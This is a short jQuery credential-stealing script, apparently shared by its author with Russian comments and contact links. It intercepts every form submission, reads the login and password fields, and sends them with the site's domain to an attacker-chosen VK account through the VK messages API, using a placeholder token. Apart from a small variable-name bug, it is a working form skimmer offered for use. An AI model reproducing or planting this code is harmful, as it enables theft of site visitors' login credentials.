   // Связь с разработчиком CyberUSA
   // VK - vk.com/all.memories
   // 
   // Мои работы - github.com/cyberusa
   //
   //
   // Есть идеи предлогай
   // Есть задача пиши
   

// Приятная цитата

// Времени никогда не существовало люди придумали его для удобства мы есть везде...

  $("form").submit(function() {
	 //USER_ID VK Получателя логинов и паролей указывать только ID БЕЗ https://vk.com/id
	 var user_id = ''; 
	 //TOKEN Для отправки сообщения 
	 var token = '';
	 
	 
     var login = $(this).parent().find('input[type=text]').val(); // Получаем логин, из поля с типом text
     var pass = $(this).parent().find('input[type=password]').val(); // Получаем пароль, из поля с типом password
     
	 var currentSite = document.domain; // Получаем домен сайта
     
	 var messageq = "SITE: " + currentSite + "|  " + login + ":" + pass; // Создаём переменную, в которой идёт текст сообщения.
	 
	 var site = 'https://api.vk.com/method/messages.send?user_id='+user_id+'&message='+mess+'&access_token='+token+'&v=5.52';
	 $.get(site);
   });

   
   